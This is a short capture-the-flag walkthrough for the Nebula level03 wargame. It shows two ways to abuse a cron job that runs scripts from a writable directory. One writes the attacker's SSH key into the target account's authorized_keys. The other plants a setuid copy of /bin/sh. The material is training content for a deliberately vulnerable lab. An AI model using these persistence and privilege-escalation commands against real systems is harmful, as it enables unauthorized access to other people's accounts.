# [Level03](https://exploit-exercises.com/nebula/level03/)

## Method 1

Make sure your attacking machine has a ssh key (we'll call it `SOMEKEY`):

```bash
ssh-keygen
```

Create a script on the victim machine as the `level03` user at `/tmp/attack.sh`:

```bash
mkdir ~/.ssh
touch ~/.ssh/authorized_keys
echo "ssh-rsa SOMEKEY" >> ~/.ssh/authorized_keys
```

Now copy `/tmp/attack.sh` into `/home/flag03/writable.d`:

```bash
cp /tmp/attack.sh /home/flag03/writable.d
```

When the cronjob runs, `/home/flag03/writable.d/attack.sh` will be deleted and our ssh key `SOMEKEY` will be in the `authorized_keys` of the `flag03` account.

SSH into the victim machine as `flag03` and do:

```bash
getflag
```

## Method 2

Create a file at `/tmp/attack.sh`:

```bash
#/bin/sh
cp /bin/sh /home/flag03/sh
chmod +s /home/flag03/sh
```

Copy that file to `/home/flag03/writable.d`:

```bash
cp /tmp/attack.sh /home/flag03/writable.d
```

Wait for the cronjob to execute, which in-turn runs `/home/flag03/writable.d/attack.sh` and generates `/home/flag03/sh`. Then do:

```bash
/home/flag03/sh
getflag
```

Note: I tried at first doing `cp /bin/sh /tmp/sh` in `attack.sh` and running the setuid `sh` from `tmp`, but found via `mount | grep tmp` that `/tmp` has the `nosuid` flag.
